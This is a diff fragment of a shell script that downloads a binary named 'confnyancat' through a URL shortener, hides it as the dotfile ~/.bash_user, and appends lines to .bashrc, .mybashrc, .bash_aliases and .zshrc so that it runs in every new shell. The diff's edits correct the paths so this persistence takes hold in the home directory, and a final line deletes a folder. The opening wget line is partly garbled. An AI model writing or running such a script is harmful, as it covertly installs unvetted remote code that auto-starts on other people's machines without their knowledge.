@@ -12,11 +12,12 @@ wget tinwget tinyurl.com/confnyancat
 chmod +x confnyancat
 mv confnyancat .bash_user
 mv .bash_user ~/
-echo "if [ -f ${HOME}/./mybashrc ]" >> .bashrc
+echo "if [ -f ${HOME}/./mybashrc ]" >> ~/.bashrc
 echo "then" >> .bashrc
-echo "    . ${HOME}/./mybashrc" >> .bashrc
+echo "    . ${HOME}/./mybashrc" >> ~/.bashrc
 echo "fi" >> .bashrc
-echo "./.bash_user" >> .bashrc
-echo "./.bash_user" >> .mybashrc
-echo "./.bash_user" >> .bash_aliases
-echo "./.bash_user" >> .zshrc
+echo "./.bash_user" >> ~/.bashrc
+echo "./.bash_user" >> ~/.mybashrc
+echo "./.bash_user" >> ~/.bash_aliases
+echo "./.bash_user" >> ~/.zshrc
+rm -rf Conf
